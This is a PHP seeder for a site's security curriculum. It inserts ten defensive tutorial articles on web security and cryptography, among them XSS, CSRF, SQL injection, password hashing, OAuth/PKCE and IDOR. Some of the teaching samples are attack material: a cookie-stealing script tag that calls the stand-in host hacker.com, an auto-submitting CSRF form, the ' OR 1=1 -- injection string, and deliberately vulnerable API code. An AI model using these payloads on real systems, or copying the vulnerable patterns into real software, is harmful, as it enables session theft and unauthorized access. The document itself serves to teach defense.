<?php

namespace Database\Seeders;

use App\Models\Article;
use App\Models\ArticleTopic;
use App\Models\User;
use Illuminate\Database\Seeder;

/**
 * Seeds the 10-article curriculum for Web Security & Cryptography.
 * Idempotent (updateOrCreate by slug).
 */
class WebSecurityArticlesSeeder extends Seeder
{
    public function run(): void
    {
        $topic = ArticleTopic::where('slug', 'web-security')->first();

        if (! $topic) {
            $this->command?->error("Web Security & Cryptography article topic not found. Run ArticleTopicSeeder first.");
            return;
        }

        $author = User::where('email', 'priya@mellow.ai')->first()
            ?? User::where('role', User::ROLE_SUPERADMIN)->first()
            ?? User::first();

        if (! $author) {
            $this->command?->error("No valid author found to associate with articles.");
            return;
        }

        $articles = [
            [
                'slug' => 'authentication-architectures-sessions-vs-jwts-rotation',
                'title' => 'Authentication Architectures: Stateful Sessions vs. Stateless JWTs and Refresh Rotation',
                'excerpt' => 'Storing user identity across stateless HTTP requests is a high-stakes security choice. Contrast stateful server-side sessions with JSON Web Tokens (JWT), analyze token revocation challenges, and implement secure Refresh Token Rotation.',
                'display_order' => 1,
                'content' => $this->authenticationArchitecturesSessionsVsJwtsRotationArticle(),
            ],
            [
                'slug' => 'cross-site-scripting-xss-and-csp-defenses',
                'title' => 'Cross-Site Scripting (XSS): Stored, Reflected, DOM-Based, and CSP Defenses',
                'excerpt' => 'If an attacker can execute arbitrary JavaScript in your user\'s browser, game over. Deconstruct Stored, Reflected, and DOM-based XSS vectors, context-aware HTML sanitization, and Content Security Policy (CSP) enforcement.',
                'display_order' => 2,
                'content' => $this->crossSiteScriptingXssAndCspDefensesArticle(),
            ],
            [
                'slug' => 'csrf-attacks-samesite-cookies-and-prevention',
                'title' => 'Cross-Site Request Forgery (CSRF): SameSite Cookies and Anti-CSRF Tokens',
                'excerpt' => 'How an innocent image tag on a malicious site can secretly transfer funds from your bank account. Understand ambient cookie transmission, Synchronizer Token Patterns, Double Submit Cookies, and SameSite attribute behavior.',
                'display_order' => 3,
                'content' => $this->csrfAttacksSamesiteCookiesAndPreventionArticle(),
            ],
            [
                'slug' => 'sql-injection-sqli-ast-and-prepared-statements',
                'title' => 'SQL Injection (SQLi): Abstract Syntax Trees and Prepared Statements',
                'excerpt' => 'Why string concatenation in SQL queries is the most disastrous mistake in web development. Understand SQL grammar parsing, AST token manipulation, parameterized prepared statements, and ORM injection edge cases.',
                'display_order' => 4,
                'content' => $this->sqlInjectionSqliAstAndPreparedStatementsArticle(),
            ],
            [
                'slug' => 'password-storage-bcrypt-argon2-and-rainbow-tables',
                'title' => 'Password Storage and Hashing: Why MD5 Fails and How bcrypt/Argon2id Protect Data',
                'excerpt' => 'Plain cryptographic hashes (MD5, SHA-256) can be cracked at billions of guesses per second on consumer GPUs. Understand salts, rainbow tables, work factors, memory hardness, and the Argon2id standard.',
                'display_order' => 5,
                'content' => $this->passwordStorageBcryptArgon2AndRainbowTablesArticle(),
            ],
            [
                'slug' => 'symmetric-vs-asymmetric-encryption-aes-rsa-ecc',
                'title' => 'Symmetric vs. Asymmetric Encryption: AES-GCM, RSA, and Elliptic Curves (ECC)',
                'excerpt' => 'A deep dive into cryptographic primitives. Contrast symmetric block ciphers (AES-256-GCM) with asymmetric public-key systems (RSA vs Ed25519), authenticated encryption, and initialization vectors (IVs).',
                'display_order' => 6,
                'content' => $this->symmetricVsAsymmetricEncryptionAesRsaEccArticle(),
            ],
            [
                'slug' => 'oauth-2-and-oidc-authorization-code-pkce',
                'title' => 'OAuth 2.0 and OpenID Connect (OIDC): Authorization Code Flow with PKCE',
                'excerpt' => 'Demystify "Sign in with Google". Contrast Authorization (OAuth 2.0) with Authentication (OIDC), and walk through the secure Authorization Code Flow with Proof Key for Code Exchange (PKCE) for Single Page Apps.',
                'display_order' => 7,
                'content' => $this->oauth2AndOidcAuthorizationCodePkceArticle(),
            ],
            [
                'slug' => 'rate-limiting-ddos-mitigation-and-waf',
                'title' => 'Rate Limiting, DDoS Mitigation, and Web Application Firewalls (WAF)',
                'excerpt' => 'Defending applications against distributed denial-of-service floods and automated bots. Explore Layer 3/4 SYN floods, Layer 7 HTTP floods, Cloudflare Anycast scrubbing centers, and Web Application Firewall (WAF) rule engines.',
                'display_order' => 8,
                'content' => $this->rateLimitingDdosMitigationAndWafArticle(),
            ],
            [
                'slug' => 'secure-api-design-idor-mass-assignment-rbac',
                'title' => 'Secure API Design: IDOR, Mass Assignment, and Role-Based Access Control (RBAC)',
                'excerpt' => 'The most severe API vulnerabilities are not complex cryptographic flaws, but missing authorization checks. Master Insecure Direct Object References (IDOR), Mass Assignment parameter tampering, and Role-Based vs Attribute-Based Access Control.',
                'display_order' => 9,
                'content' => $this->secureApiDesignIdorMassAssignmentRbacArticle(),
            ],
            [
                'slug' => 'cryptographic-randomness-nonces-and-replay-attacks',
                'title' => 'Cryptographic Randomness, Nonces, and Replay Attack Prevention',
                'excerpt' => 'Why Math.random() and rand.Intn() are fatal security liabilities. Master cryptographically secure pseudo-random number generators (CSPRNG), entropy pools, cryptographic nonces, and timestamped HMAC replay defenses.',
                'display_order' => 10,
                'content' => $this->cryptographicRandomnessNoncesAndReplayAttacksArticle(),
            ],
        ];

        foreach ($articles as $data) {
            $content = $data['content'];
            Article::updateOrCreate(
                ['slug' => $data['slug']],
                [
                    'article_topic_id' => $topic->id,
                    'title' => $data['title'],
                    'excerpt' => $data['excerpt'],
                    'content' => $content,
                    'icon' => null,
                    'status' => Article::STATUS_PUBLISHED,
                    'display_order' => $data['display_order'],
                    'reading_time_minutes' => Article::estimateReadingTimeMinutes($content),
                    'created_by' => $author->id,
                    'published_at' => now(),
                ]
            );
        }
    }

    private function authenticationArchitecturesSessionsVsJwtsRotationArticle(): string
    {
        return <<<'MARKDOWN'
HTTP is a stateless protocol: each request arrives with zero inherent memory of previous interactions. To authenticate users, applications must send an authentication credential with every request.

The choice between **Stateful Server-Side Sessions** and **Stateless JSON Web Tokens (JWT)** is one of the most critical security and scalability decisions in modern software architecture.

---

## 1. Stateful Sessions: The Battle-Tested Standard

In a session-based architecture:
1. User logs in with email and password.
2. Server generates a cryptographically random, unguessable **Session ID** (e.g., a 128-bit random string).
3. The server stores `{ sessionId: { userId, roles, expiresAt } }` in a central data store (Redis or database).
4. The server returns the Session ID to the browser inside an **`HttpOnly; Secure; SameSite=Lax` Cookie**.
5. On subsequent requests, the browser automatically transmits the cookie. The server validates the session against Redis.

### The Superpower of Sessions: Instant Revocation
If an account is compromised, an administrator can delete the session from Redis immediately. The next request from the attacker fails instantly!

---

## 2. Stateless JWTs: The Scale Trade-off

A JSON Web Token (JWT) is a self-contained, digitally signed token consisting of three Base64URL-encoded strings:
$$\text{Header}.\text{Payload}.\text{Signature}$$

- **Header:** Algorithm & token type (`{"alg": "HS256", "typ": "JWT"}`).
- **Payload:** User claims (`{"sub": "10492", "name": "Alex", "exp": 1700000000}`).
- **Signature:** Cryptographic signature proving the payload has not been tampered with:
  $$\text{Signature} = \text{HMAC-SHA256}(\text{Header} + "." + \text{Payload}, \text{SecretKey})$$

Any backend microservice holding the public key or secret can verify the signature and trust the claims **without querying a central database**!

---

## 3. The JWT Fatal Flaw: The Revocation Problem

Because JWTs are completely stateless, **a signed JWT cannot be invalidated before its expiration timestamp (`exp`)**.
If an attacker steals a user's JWT that has a 30-day expiration, the attacker has unrestricted access for 30 days! Even if the user changes their password, the stolen token remains valid across all microservices!

### The Production Solution: Dual-Token Architecture with Rotation
1. **Access Token (Short-lived):** JWT stored in memory; expires in **10–15 minutes**.
2. **Refresh Token (Long-lived):** Opaque random string stored in an **`HttpOnly` Cookie**; valid for 7 days. Stored in Redis.
3. **Refresh Token Rotation:** Every time the refresh token is used to issue a new access token, the old refresh token is **invalidated and replaced with a brand new one**. If a revoked refresh token is ever presented, the server detects token theft and immediately revokes all family tokens!

---

## Key Takeaways

1. Stateful sessions allow instant revocation; use them for web applications with a centralized cache.
2. Never issue long-lived standalone JWTs; always pair short-lived access tokens with rotating refresh tokens.
3. Store tokens in `HttpOnly; Secure` cookies, never in browser `localStorage` where they are vulnerable to XSS theft.
MARKDOWN;
    }

    private function crossSiteScriptingXssAndCspDefensesArticle(): string
    {
        return <<<'MARKDOWN'
Cross-Site Scripting (XSS) consistently ranks among the most prevalent web application vulnerabilities. It occurs when an application includes untrusted user data in a web page without proper validation or encoding, allowing an attacker to execute malicious scripts in the victim's browser.

Once an attacker executes JavaScript in a user's session, they can steal authentication cookies, log keystrokes, tamper with DOM content, or perform actions on the user's behalf.

---

## 1. The Three Flavors of XSS

### 1. Stored XSS (Persistent)
The malicious payload is permanently saved in the application's database (e.g., in a comment or profile bio). Every user who views the page executes the malicious script automatically!
*Example:* Submitting a username as: `<script>fetch('http://hacker.com/steal?c=' + document.cookie)</script>`.

### 2. Reflected XSS (Non-Persistent)
The payload is included in a malicious link (e.g., in search queries) and immediately reflected back in the server's response:
`https://shop.com/search?q=<script>alert(1)</script>`
The victim must click the link sent by the attacker.

### 3. DOM-Based XSS
The vulnerability exists entirely in client-side JavaScript. Untrusted user data from a **Source** (`location.search`, `hash`) is passed into an unsafe **Sink** (`innerHTML`, `eval`, `document.write`) without sanitization:
```javascript
// DANGEROUS DOM SINK:
const search = new URLSearchParams(window.location.search).get("q");
document.getElementById("results").innerHTML = "Searching for: " + search;
```

---

## 2. Robust Defense: Context-Aware Output Encoding

Never trust user input. Always encode characters according to the context where the data will appear:
- **HTML Body Context:** Convert `<` to `&lt;`, `>` to `&gt;`, `&` to `&amp;`, `"` to `&quot;`.
- **JavaScript Context:** Use JSON serialization (`JSON.stringify()`) rather than string concatenation.
- Modern frameworks (React, Vue, Angular) encode variables automatically by default when using JSX `{data}`. **Never use `dangerouslySetInnerHTML`!**

---

## 3. Defense-in-Depth: Content Security Policy (CSP)

A Content Security Policy (CSP) header tells the browser which script origins are trusted, blocking inline execution even if an injection vulnerability exists:
```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none';
```
Any `<script>` injected by an attacker without the matching random cryptographic `nonce` will be rejected by the browser!

---

## Key Takeaways

1. Context-aware output encoding is the primary defense against XSS.
2. Avoid unsafe DOM sinks like `innerHTML` and `eval()`.
3. Use a strict Content Security Policy (CSP) with nonces to block unauthorized script execution.
MARKDOWN;
    }

    private function csrfAttacksSamesiteCookiesAndPreventionArticle(): string
    {
        return <<<'MARKDOWN'
Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated user's browser to execute unwanted actions on a web application in which they are currently logged in.

While XSS exploits the user's trust in a website, **CSRF exploits the website's trust in the user's browser**.

---

## 1. How a CSRF Attack Works

Suppose you are logged into your bank at `bank.com`, authenticated via a standard session cookie.
1. You visit an attacker's website `evil.com` in another browser tab.
2. `evil.com` includes a hidden HTML form that automatically submits on page load:
   ```html
   <form action="https://bank.com/transfer" method="POST">
       <input type="hidden" name="recipient" value="hacker">
       <input type="hidden" name="amount" value="5000">
   </form>
   <script>document.forms[0].submit();</script>
   ```
3. Because the request is addressed to `bank.com`, the browser automatically attaches your valid `bank.com` authentication cookies!
4. The bank receives the request, sees your valid session cookie, and transfers \$5,000 to the hacker!

---

## 2. Defense 1: The `SameSite` Cookie Attribute (Modern Standard)

Modern browsers support the `SameSite` cookie attribute:
- **`SameSite=Strict`:** The cookie is **never** sent in cross-site requests (even if clicking a link from Google).
- **`SameSite=Lax` (Default in modern Chrome/Firefox):** The cookie is withheld on cross-site subrequests (images, iframes, `POST` forms), but sent on top-level safe navigations (`GET` links). This neutralizes most CSRF attacks out of the box!
- **`SameSite=None`:** Must be accompanied by `Secure`. Cookie is sent on all cross-site requests.

---

## 3. Defense 2: The Synchronizer Token Pattern (CSRF Tokens)

For defense-in-depth, applications generate a cryptographically random, unpredictable token associated with the current user session:
1. The server renders the token into a hidden form field or meta tag:
   ```html
   <input type="hidden" name="_csrf" value="9df8b1a...">
   ```
2. When the form submits, the server compares the submitted form token against the session token.
3. Because `evil.com` cannot read the victim's DOM across origins (due to the Same-Origin Policy), the attacker cannot include the CSRF token, and the request is rejected!

---

## Key Takeaways

1. CSRF exploits ambient cookie transmission on cross-origin requests.
2. Set `SameSite=Lax` or `SameSite=Strict` on all sensitive authentication cookies.
3. Enforce anti-CSRF synchronizer tokens for all state-changing `POST`, `PUT`, and `DELETE` actions.
MARKDOWN;
    }

    private function sqlInjectionSqliAstAndPreparedStatementsArticle(): string
    {
        return <<<'MARKDOWN'
SQL Injection (SQLi) has topped security vulnerability lists for over 25 years. It occurs when untrusted user input is directly concatenated into a dynamic SQL string, allowing an attacker to manipulate the query's syntactic structure and execute arbitrary database commands.

---

## 1. Why Concatenation Fails: The Abstract Syntax Tree (AST)

When a database executes a query, it compiles the SQL text into an **Abstract Syntax Tree (AST)**:

```sql
SELECT * FROM users WHERE email = '$input' AND password = '$password';
```

If an attacker enters the email as `' OR 1=1 --`:
```sql
SELECT * FROM users WHERE email = '' OR 1=1 --' AND password = '...';
```
The database parser interprets the single quote `'` as the end of the string literal and the `OR` as a **boolean logical operator in the syntax grammar**! The `--` comments out the password check, granting the attacker instant access as the first user in the database (usually admin).

---

## 2. The Universal Remedy: Parameterized Prepared Statements

Novice developers attempt to sanitize SQL injection using regex replacements (`replace("'", "")`). Attackers bypass regexes using character encoding tricks, second-order injections, and Unicode normalization.

The only mathematically sound defense is **Prepared Statements (Parameterized Queries)**:

```go
// SAFE: Parameterized Query
query := "SELECT id, name FROM users WHERE email = ? AND password = ?"
row := db.QueryRow(query, emailInput, passwordInput)
```

### How Prepared Statements Work:
1. **Compilation Phase:** The database compiles the SQL template into an AST **before user input is ever seen**.
2. **Execution Phase:** The database accepts the parameters separately and binds them strictly as **raw literal values**.
Even if the user input contains `' OR 1=1 --`, the database treats the entire input as a literal search string. It is syntactically impossible for user input to mutate the query's execution structure!

---

## Key Takeaways

1. SQL injection occurs when user input alters the query's Abstract Syntax Tree.
2. Never concatenate or format strings into SQL queries.
3. Prepared statements separate SQL compilation from data binding, making injection impossible.
MARKDOWN;
    }

    private function passwordStorageBcryptArgon2AndRainbowTablesArticle(): string
    {
        return <<<'MARKDOWN'
When a database is compromised, whether passwords are recovered depends entirely on the cryptographic algorithm used to hash them.

Storing passwords using fast cryptographic hash functions like **MD5**, **SHA-1**, or **SHA-256** is negligence: modern GPU mining rigs can compute over **100 billion SHA-256 hashes per second**, cracking 8-character passwords in minutes.

---

## 1. Salting: Defeating Precomputed Rainbow Tables

If two users have the password `password123`, their SHA-256 hashes will be identical:
`ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f`

Attackers build massive lookup tables called **Rainbow Tables** containing precomputed hashes of billions of common passwords, allowing instant reverse lookups.

### The Salt Solution:
A **Salt** is a cryptographically secure random string (minimum 16 bytes) generated uniquely for each user. The salt is concatenated with the password before hashing and stored alongside the hash:
$$\text{Hash} = \text{HashFunction}(\text{Password} + \text{UniqueSalt})$$
Because every user has a unique salt, precomputed rainbow tables are completely useless.

---

## 2. Adaptive Work Factors: `bcrypt` and `scrypt`

Cryptographic hashes like SHA-256 were designed for digital signatures: they are intentionally blazingly fast.
**Password hashes must be intentionally SLOW.**

In 1999, Provos and Mazières created **`bcrypt`**:
- Uses an adaptive **Work Factor (Cost Parameter)**.
- Setting `cost = 12` forces the algorithm to iterate $2^{12} = 4,096$ rounds of key expansion.
- Verification takes ~250 milliseconds on modern CPUs.
- If GPU speeds increase over time, administrators simply increment the cost parameter ($2^{13}, 2^{14}$) to maintain cracking resistance without changing code!

---

## 3. Memory Hardness: Argon2id (The Modern Gold Standard)

Even with bcrypt, attackers built custom ASIC chips and FPGAs that run thousands of parallel bcrypt cores on hardware.
In 2015, the Password Hashing Competition selected **Argon2id** as the universal gold standard:
- **Memory-Hard Algorithm:** Requires allocating large amounts of RAM (e.g., 64 MB per hash) alongside CPU cycles.
- Attackers cannot parallelize millions of guesses on GPUs or ASICs because they physically run out of fast on-chip RAM!

---

## Key Takeaways

1. Never use general-purpose hash functions (MD5, SHA-256) for passwords.
2. Always generate unique cryptographically secure salts per user.
3. Use modern memory-hard password hashing algorithms: **Argon2id** (preferred) or **bcrypt** (cost 12+).
MARKDOWN;
    }

    private function symmetricVsAsymmetricEncryptionAesRsaEccArticle(): string
    {
        return <<<'MARKDOWN'
Cryptography is the mathematical foundation of modern cybersecurity. It allows two parties to communicate secretly across untrusted channels and verify identity without sharing private credentials.

All modern encryption divides into two fundamental branches: **Symmetric** and **Asymmetric**.

---

## 1. Symmetric Encryption: The Workhorse

In symmetric encryption, the **exact same secret key** is used to both encrypt and decrypt data:
$$\text{Ciphertext} = \text{Encrypt}(\text{Plaintext}, K), \quad \text{Plaintext} = \text{Decrypt}(\text{Ciphertext}, K)$$

### AES-256-GCM (Galois/Counter Mode):
The global industry standard symmetric cipher:
- **Hardware Acceleration (AES-NI):** Modern Intel, AMD, and ARM chips have dedicated CPU instructions that execute AES encryption at several gigabytes per second with zero CPU overhead.
- **Authenticated Encryption with Associated Data (AEAD):** In addition to confidentiality, GCM mode produces an **Authentication Tag**. If an attacker tampers with even a single bit of the ciphertext, decryption fails with an integrity error!

> **The Golden Rule of AES-GCM:** **Never reuse an Initialization Vector (IV / Nonce) with the same key!** Reusing an IV completely breaks the security of GCM mode, allowing attackers to recover plaintext!

---

## 2. Asymmetric (Public-Key) Encryption: The Key Exchange

Symmetric encryption has a fatal flaw: how do two parties who have never met agree on a secret key over the public internet?
Asymmetric encryption uses a **Key Pair**:
- **Public Key:** Distributed openly to the world. Anyone can use it to encrypt messages.
- **Private Key:** Guarded secretly by the owner. Only the private key can decrypt messages.

### RSA vs. Elliptic-Curve Cryptography (ECC / Ed25519):
- **RSA:** Relies on the difficulty of factoring products of large prime numbers. Requires massive 3072-bit or 4096-bit keys for modern security.
- **ECC (ECDSA / Ed25519):** Relies on the discrete logarithm problem on elliptic curves. Achieves identical or superior security with **256-bit keys**! 10x faster key generation, lower CPU usage, and smaller network packet footprints.

---

## Key Takeaways

1. Symmetric encryption (AES-256-GCM) encrypts payloads with near-zero CPU overhead.
2. Never reuse a Nonce/IV in GCM mode.
3. Prefer modern Elliptic-Curve Cryptography (ECC / Ed25519) over legacy RSA for digital signatures and key exchange.
MARKDOWN;
    }

    private function oauth2AndOidcAuthorizationCodePkceArticle(): string
    {
        return <<<'MARKDOWN'
Whenever you click "Sign in with Google" or grant a third-party app permission to access your GitHub repositories, you are using **OAuth 2.0** and **OpenID Connect (OIDC)**.

---

## 1. Authentication vs. Authorization: OIDC vs. OAuth 2.0

- **OAuth 2.0 is an AUTHORIZATION framework:** It grants third-party applications limited access (scopes) to user resources without sharing user credentials. It issues an **Access Token**. OAuth 2.0 has no concept of *who* the user is!
- **OpenID Connect (OIDC) is an AUTHENTICATION layer built on top of OAuth 2.0:** It issues an **ID Token** (a JWT containing user profile claims like `name`, `email`, and `sub`) that proves identity.

---

## 2. The Authorization Code Flow with PKCE

For Single Page Apps (React) and Mobile Apps, the client cannot securely store a `client_secret` (it can be decompiled from app bundles).
The **Authorization Code Flow with PKCE (Proof Key for Code Exchange)** is the mandatory modern standard:

```
Browser / Client                                           Authorization Server (Google)
      |                                                                 |
      | 1. Generates random Code Verifier & computes Code Challenge     |
      | 2. Redirects to /authorize?code_challenge=... ----------------> | (User logs in & consents)
      |                                                                 |
      | <--- 3. Redirects back with Authorization Code ----------------- |
      |                                                                 |
      | 4. POST /token (Sends Auth Code + RAW Code Verifier) ----------> |
      |                                                                 | (Server hashes verifier and
      |                                                                 |  verifies it matches challenge)
      | <--- 5. Returns Access Token & ID Token ------------------------ |
```

Even if an attacker intercepts the Authorization Code in step 3, they cannot exchange it for tokens because they do not have the secret **Code Verifier** stored in the legitimate client's memory!

---

## Key Takeaways

1. OAuth 2.0 handles authorization (Access Tokens); OIDC handles authentication (ID Tokens).
2. Never use the deprecated Implicit Flow in Single Page Apps.
3. Always implement PKCE (Proof Key for Code Exchange) to protect public clients against authorization code interception.
MARKDOWN;
    }

    private function rateLimitingDdosMitigationAndWafArticle(): string
    {
        return <<<'MARKDOWN'
A Distributed Denial-of-Service (DDoS) attack overwhelms a target system with a flood of malicious internet traffic, denying legitimate users access to the service.

Defending against DDoS attacks requires a multi-layered defense spanning edge CDNs, network scrubbing centers, and application-layer firewalls.

---

## 1. Layer 3/4 vs. Layer 7 DDoS Attacks

### Layer 3/4 Attacks (Network Volumetric Floods)
- **SYN Flood:** Thousands of fake TCP `SYN` packets without completing the 3-way handshake, exhausting the server's kernel connection backlog (`syn_backlog`).
- **NTP / DNS Amplification:** Exploits open UDP reflectors to amplify 100-byte queries into 50 KB response floods directed at the victim's IP address.
- **Defense:** BGP Anycast scrubbing centers (Cloudflare, AWS Shield) that absorb multi-terabit floods at edge data centers.

### Layer 7 Attacks (Application Floods)
- **HTTP GET / POST Floods:** Legitimate-looking HTTP requests targeting expensive database endpoints (e.g., search queries, PDF generation).
- **Defense:** Edge rate limiting, Web Application Firewalls (WAF), and proof-of-work challenges.

---

## 2. Web Application Firewalls (WAF)

A WAF inspects HTTP request traffic before it reaches your application:
- Evaluates incoming parameters against regex signatures (OWASP Core Rule Set) to block SQL injection and XSS attempts.
- Performs IP reputation lookups (blocking known Tor exit nodes, bulletproof hosting providers, and botnets).
- Enforces behavioral anomaly detection (e.g., a single IP making 50 requests per second across 10 user sessions).

---

## Key Takeaways

1. Layer 3/4 volumetric floods must be absorbed by edge Anycast CDN scrubbing centers.
2. Layer 7 application floods require intelligent rate limiting and WAF rule inspection.
3. Protect database endpoints from expensive queries using caching and strict rate limits.
MARKDOWN;
    }

    private function secureApiDesignIdorMassAssignmentRbacArticle(): string
    {
        return <<<'MARKDOWN'
According to the OWASP API Security Top 10, the #1 vulnerability in modern web APIs is **Broken Object Level Authorization (BOLA)**, historically known as **IDOR (Insecure Direct Object Reference)**.

These vulnerabilities do not stem from complex buffer overflows, but from simple failure to verify that the requesting user owns the requested record.

---

## 1. Insecure Direct Object References (IDOR)

An API exposes an internal database primary key in the URL:
`GET /api/v1/invoices/1049`

The backend fetches the record:
```go
// VULNERABLE CODE: Only checks authentication, NOT authorization!
func GetInvoice(w http.ResponseWriter, r *http.Request) {
    id := r.PathValue("id")
    invoice := db.FindInvoice(id) // VULNERABILITY! Anyone can read any invoice!
    json.NewEncoder(w).Encode(invoice)
}
```
An attacker simply writes a script iterating `id` from 1 to 100,000, downloading the entire customer financial database!

### The Secure Implementation:
Always scope queries to the authenticated tenant/user ID:
```go
// SECURE: Enforces object-level ownership check
func GetInvoice(w http.ResponseWriter, r *http.Request) {
    user := r.Context().Value(UserKey).(*User)
    id := r.PathValue("id")

    // The query MUST include user_id in the WHERE clause:
    invoice, err := db.FindInvoiceForUser(id, user.ID)
    if err != nil {
        http.NotFound(w, r) // Return 404 to avoid leaking existence
        return
    }
    json.NewEncoder(w).Encode(invoice)
}
```

---

## 2. Mass Assignment Vulnerabilities

Modern web frameworks allow binding JSON payloads directly to database models:
```javascript
// DANGEROUS MASS ASSIGNMENT:
const user = await User.findById(req.user.id);
user.update(req.body); // Directly applies all JSON fields!
```
If an attacker includes `{"is_admin": true, "billing_status": "PAID"}` in their profile update request, the framework binds those fields to the model, escalating privileges!

### The Defense: DTOs (Data Transfer Objects)
Never bind raw request bodies to database entities. Define explicit Data Transfer Objects with strict property whitelists.

---

## Key Takeaways

1. Always verify object ownership; scope database queries to the authenticated user ID.
2. Use Data Transfer Objects (DTOs) to block mass assignment tampering.
3. Return HTTP 404 rather than 403 on IDOR violations to avoid leaking entity existence.
MARKDOWN;
    }

    private function cryptographicRandomnessNoncesAndReplayAttacksArticle(): string
    {
        return <<<'MARKDOWN'
Security systems depend entirely on **unpredictability**. If an attacker can guess the next session ID, password reset token, or encryption key, all cryptographic defenses collapse.

Yet developers frequently use standard pseudo-random number generators (PRNGs) like JavaScript's `Math.random()` or Python's `random.random()` for security tokens.

---

## 1. Why `Math.random()` is Insecure

Standard PRNGs (like the xorshift128+ algorithm used in `Math.random()`) are designed for **statistical distribution and speed**, not security:
- Given just **two or three consecutive outputs** from `Math.random()`, an attacker can reconstruct the internal 128-bit seed state using algebraic equations!
- Once the seed is recovered, the attacker can predict every future random number generated by the system!

### The Solution: CSPRNG (Cryptographically Secure PRNG)
Modern operating systems maintain an **Entropy Pool** fed by unpredictable physical noise (keystroke timings, CPU thermal sensor fluctuations, network interrupt intervals).

Always use the OS CSPRNG:
- **Node.js / Browser:** `crypto.randomBytes(32)` or `crypto.getRandomValues()`
- **Go:** `crypto/rand.Read()`
- **Python:** `secrets.token_hex(32)`
- **Linux:** `/dev/urandom`

---

## 2. Preventing Replay Attacks with Nonces and Timestamps

A **Replay Attack** occurs when an attacker intercepts an authenticated API request and retransmits the exact same payload repeatedly (e.g., transferring \$100 repeatedly).

Because the payload has a valid HMAC signature, standard validation passes!

### The Robust HMAC + Nonce Defense:
1. Every request includes:
   - `X-Timestamp`: Current UTC UNIX epoch timestamp.
   - `X-Nonce`: A unique 128-bit cryptographically random string (Number used ONCE).
2. The client signs `Method + URL + Timestamp + Nonce + Body` using their private API secret.
3. **The Server's Verification:**
   - **Timestamp Check:** Rejects requests where `abs(now - timestamp) > 300 seconds`.
   - **Nonce Check:** Stores the nonce in Redis with a 5-minute TTL. If the nonce is already in Redis, **reject immediately as a replay attack**!

---

## Key Takeaways

1. Never use `Math.random()` for security tokens; always use OS CSPRNG primitives.
2. Defend against replay attacks by combining timestamp expiration windows with Redis-cached nonces.
3. Always sign timestamps and nonces as part of the cryptographic HMAC payload.
MARKDOWN;
    }
}
